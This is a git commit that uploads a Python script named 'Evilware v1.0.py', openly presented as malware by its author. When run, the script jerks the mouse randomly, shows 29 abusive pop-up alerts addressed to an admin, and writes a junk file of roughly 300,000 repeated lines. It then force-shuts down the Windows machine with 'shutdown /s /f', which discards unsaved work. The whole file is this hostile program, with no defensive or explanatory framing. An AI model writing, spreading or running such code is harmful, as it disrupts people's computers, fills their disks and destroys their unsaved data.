3af04b8ee2cb2fadaee46e696f438a9b19d1b5fd
arianchemist <74075426+arianchemist@users.noreply.github.com>
2021-07-30 10:05:29 -0700

    Add files via upload

---
+++ Evilware v1.0.py
@@ -0,0 +1,55 @@
+import pyautogui
+import os
+import time
+import random
+
+
+
+
+def jevtt():
+    time.sleep(3.2)
+    os.system("shutdown /s /f /c Evil.core ")
+
+for o in range(1 , 133): 
+    ju = [21 , 44 , 7 , 33]
+    k4 = random.choice(ju)
+    k7 = random.choice(ju)
+    pyautogui.move(k4 , k7)
+
+for e in range(1 , 30):
+    pyautogui.alert(text = "Evil.Core was here. Fuck you admin your security is shit" , title = "!!!!!!" , button = "haha")
+
+
+
+
+n = open("zzr.txt" , "w")
+
+
+aayv = 1
+
+for aayv in range(1 , 300000):
+    n.write("Evil.C0REEvil.C0REEvil.C0REEvil.C0REEvil.C0REEvil.C0REEvil.C0REEvil.C0REEvil.C0REEvil.C0REEvil.C0REEvil.C0REEvil.C0REEvil.C0REEvil.C0REEvil.C0RE")
+
+
+n.close()
+
+
+
+
+
+
+jevtt()
+
+
+
+
+
+
+
+
+
+
+
+
+
+# made by arianchemist for Evil.C0RE
